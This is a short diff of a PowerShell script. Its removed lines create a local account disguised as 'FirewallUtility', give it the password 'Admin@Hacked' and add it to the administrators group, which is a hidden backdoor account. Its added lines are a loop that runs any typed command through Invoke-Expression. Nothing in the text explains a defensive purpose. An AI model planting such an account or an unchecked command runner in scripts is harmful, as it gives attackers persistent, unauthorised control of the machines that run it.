@@ -1,5 +1,13 @@
-net user /add FirewallUtility Admin@Hacked
-net localgroup administrators FirewallUtility /add
-$hostname = hostname
-Write-Host "Hostname: $hostname"
-pause
+while ($true) {
+    $userInput = Read-Host "Command (type 'exit' to quit): "
+
+    if ($userInput -eq "exit") {
+        break
+    }
+
+    try {
+        Invoke-Expression $userInput
+    } catch {
+        Write-Host "Error: $_"
+    }
+}
